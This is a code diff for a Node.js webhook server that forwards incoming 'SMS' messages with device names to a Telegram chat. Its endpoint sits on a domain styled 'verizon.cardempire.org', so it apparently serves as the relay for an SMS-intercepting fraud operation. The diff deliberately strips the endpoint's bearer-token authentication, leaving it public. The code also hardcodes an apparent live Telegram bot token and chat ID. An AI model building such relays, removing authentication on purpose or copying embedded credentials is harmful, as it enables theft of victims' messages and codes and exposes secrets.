@@ -7,7 +7,6 @@ const PORT = process.env.PORT || 10000;
 // ============================================================
 const TELEGRAM_BOT_TOKEN = "8712348926:AAGSgG2F5_xOGWkNEoMfmn6Fr7AtBPG6_u0";
 const TELEGRAM_CHAT_ID = "-1004392052306";
-const WEBHOOK_SECRET = "sb_publishable_2eRAvmafnr_Ir6c6EgTHqQ_tSZRmUJJ";
 
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
@@ -38,21 +37,14 @@ app.get("/verify", (req, res) => {
     message: "Verify endpoint is active. Send POST requests here.",
     method: "POST",
     required_fields: ["message", "device_name"],
-    auth: "Bearer token required"
+    auth: "No authorization required (public endpoint)"
   });
 });
 
-// Main webhook endpoint - /verify
+// Main webhook endpoint - /verify (NO AUTH REQUIRED)
 app.post("/verify", async (req, res) => {
   try {
-    // 1. Authentication
-    const auth = req.headers.authorization;
-    if (!auth || auth !== `Bearer ${WEBHOOK_SECRET}`) {
-      console.warn("❌ Auth failed");
-      return res.status(401).json({ error: "Unauthorized" });
-    }
-
-    // 2. Get data from request
+    // 1. Get data from request (NO AUTH CHECK)
     const { message, device_name } = req.body;
     
     console.log("📨 Webhook request received");
@@ -62,7 +54,7 @@ app.post("/verify", async (req, res) => {
       return res.status(400).json({ error: "Missing field: message" });
     }
 
-    // 3. Format Telegram message
+    // 2. Format Telegram message
     const deviceName = device_name || "Unknown Device";
     const timestamp = new Date().toLocaleString();
     
@@ -70,9 +62,8 @@ app.post("/verify", async (req, res) => {
 
     console.log("📤 Sending to Telegram...");
     console.log("Chat ID:", TELEGRAM_CHAT_ID);
-    console.log("Message:", telegramText);
 
-    // 4. Send to Telegram
+    // 3. Send to Telegram
     const telegramResponse = await fetch(TELEGRAM_API_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -96,7 +87,7 @@ app.post("/verify", async (req, res) => {
 
     console.log("✅ Telegram sent successfully!");
     
-    // 5. Success
+    // 4. Success
     res.json({ 
       success: true, 
       message: "SMS forwarded to Telegram" 
@@ -117,5 +108,5 @@ app.post("/verify", async (req, res) => {
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`🚀 Webhook host running on port ${PORT}`);
   console.log(`📡 Endpoint: https://verizon.cardempire.org/verify`);
-  console.log(`🔑 Auth: Bearer ${WEBHOOK_SECRET}`);
+  console.log(`🔓 No authorization required (public endpoint)`);
 });
